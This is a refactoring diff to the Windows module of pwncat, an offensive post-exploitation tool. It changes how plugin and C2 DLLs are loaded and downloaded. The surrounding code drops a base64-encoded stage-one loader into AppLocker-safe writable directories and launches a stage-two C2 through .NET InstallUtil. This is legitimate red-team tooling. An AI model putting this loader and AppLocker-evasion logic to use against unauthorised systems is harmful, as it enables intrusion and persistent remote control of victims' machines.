@@ -458,7 +458,8 @@ class Windows(Platform):
         ),
     ]
 
-    def open_plugin(self, name: str) -> BytesIO:
+    @classmethod
+    def open_plugin(cls, manager: "pwncat.manager.Manager", name: str) -> BytesIO:
         """
         Open the given plugin DLL for reading and return an open file object.
         If the given name matches a builtin plugin, it will be used. If a
@@ -467,21 +468,21 @@ class Windows(Platform):
         provided plugin DLL, it is interpreted as a path and attempted to be
         opened.
 
+        :param manager: the pwncat manager object used to locate the plugin directory
+        :type manager: pwncat.manager.Manager
         :param name: name of the plugin being requested
         :type name: str
-        :param plugin_path: path to the directory to store plugins
-        :type plugin_path: str
         :rtype: BytesIO
         """
 
-        for plugin in self.PLUGIN_INFO:
+        for plugin in cls.PLUGIN_INFO:
             if name in plugin.provides:
                 break
         else:
             return open(name, "rb")
 
         path = (
-            pathlib.Path(self.session.config["plugin_path"])
+            pathlib.Path(manager.config["plugin_path"])
             / plugin.name
             / plugin.version
             / name
@@ -490,22 +491,17 @@ class Windows(Platform):
             path.parent.mkdir(parents=True, exist_ok=True)
             url = plugin.url.format(version=plugin.version)
 
-            with self.session.task(
-                f"downloading {plugin.name}", status="grabbing archive"
-            ) as task:
-                with requests.get(
-                    plugin.url.format(version=plugin.version),
-                    stream=True,
-                ) as request:
-                    data = request.raw.read()
-                    with tarfile.open(mode="r:gz", fileobj=BytesIO(data)) as tar:
-                        for provided in plugin.provides:
-                            self.session.update_task(
-                                task, status=f"extracting {provided}"
-                            )
-                            with tar.extractfile(provided) as provided_filp:
-                                with (path.parent / provided).open("wb") as output:
-                                    shutil.copyfileobj(provided_filp, output)
+            manager.log(f"[blue]windows[/blue]: downloading {plugin.name} plugin")
+            with requests.get(
+                plugin.url.format(version=plugin.version),
+                stream=True,
+            ) as request:
+                data = request.raw.read()
+                with tarfile.open(mode="r:gz", fileobj=BytesIO(data)) as tar:
+                    for provided in plugin.provides:
+                        with tar.extractfile(provided) as provided_filp:
+                            with (path.parent / provided).open("wb") as output:
+                                shutil.copyfileobj(provided_filp, output)
 
         return path.open("rb")
 
@@ -627,40 +623,6 @@ function prompt {
 }"""
         )
 
-    def _ensure_libs(self):
-        """This method checks that stageone.dll and stagetwo.dll exist within
-        the directory specified by the windows_c2_dir configuration. If they do
-        not, a release copy is downloaded from GitHub. The specific release version
-        is defined by the PWNCAT_WINDOWS_C2_RELEASE_URL variable defined at the top
-        of this file. It should be updated whenever a new C2 version is released."""
-
-        location = pathlib.Path(self.session.config["windows_c2_dir"]).expanduser()
-        location.mkdir(parents=True, exist_ok=True)
-
-        if (
-            not (location / f"stageone-{PWNCAT_WINDOWS_C2_VERSION}.dll").exists()
-            or not (location / f"stagetwo-{PWNCAT_WINDOWS_C2_VERSION}.dll").exists()
-        ):
-            self.session.manager.log(
-                f"Downloading Windows C2 binaries ({PWNCAT_WINDOWS_C2_VERSION}) from GitHub..."
-            )
-            with requests.get(
-                PWNCAT_WINDOWS_C2_RELEASE_URL.format(version=PWNCAT_WINDOWS_C2_VERSION),
-                stream=True,
-            ) as request:
-                data = request.raw.read()
-                with tarfile.open(mode="r:gz", fileobj=BytesIO(data)) as tar:
-                    with tar.extractfile("stageone.dll") as stageone:
-                        with (
-                            location / f"stageone-{PWNCAT_WINDOWS_C2_VERSION}.dll"
-                        ).open("wb") as output:
-                            shutil.copyfileobj(stageone, output)
-                    with tar.extractfile("stagetwo.dll") as stagetwo:
-                        with (
-                            location / f"stagetwo-{PWNCAT_WINDOWS_C2_VERSION}.dll"
-                        ).open("wb") as output:
-                            shutil.copyfileobj(stagetwo, output)
-
     def _bootstrap_stage_two(self):
         """This routine upgrades a standard powershell or cmd shell to an
         instance of the pwncat stage two C2. It will first locate a valid
@@ -693,7 +655,7 @@ function prompt {
 
         # Read the loader
         # with stageone.open("rb") as filp:
-        with self.open_plugin("stageone.dll") as filp:
+        with Windows.open_plugin(self.manager, "stageone.dll") as filp:
             loader_dll = base64.b64encode(filp.read())
 
         # Extract first chunk
@@ -713,11 +675,11 @@ function prompt {
             self.channel.recvline()
             result = self.channel.recvuntil(b">")
             if b"denied" not in result.lower():
-                self.session.manager.log(f"Good path: {possible}")
+                self.session.log(
+                    f"dropping stage one in {repr(str(loader_remote_path))}"
+                )
                 break
         else:
-            self.session.manager.log(f"Bad path: {possible}")
-            self.session.manager.log(result)
             raise PlatformError("no writable applocker-safe directories")
 
         # Write remaining chunks to selected path
@@ -760,7 +722,11 @@ function prompt {
         # Note whether this is 64-bit or not
         is_64 = "\\Framework64\\" in install_utils
 
-        self.session.manager.log(f"Selected Install Utils: {install_utils}")
+        version = pathlib.PureWindowsPath(install_utils).parts[-2]
+
+        self.session.log(
+            f"using install utils from .net [cyan]{version}[/cyan]", highlight=False
+        )
 
         install_utils = install_utils.replace(" ", "\\ ")
 
@@ -776,7 +742,7 @@ function prompt {
         self.channel.recvuntil(b"\n")
 
         # Load, Compress and Encode stage two
-        with self.open_plugin("stagetwo.dll") as filp:
+        with Windows.open_plugin(self.manager, "stagetwo.dll") as filp:
             stagetwo_dll = filp.read()
             compressed = BytesIO()
             with gzip.GzipFile(fileobj=compressed, mode="wb") as gz:
@@ -1520,7 +1486,7 @@ function prompt {
             pass
 
         if content is None:
-            with self.open_plugin(name) as filp:
+            with Windows.open_plugin(self.manager, name) as filp:
                 content = filp.read()
 
         if not isinstance(content, bytes):
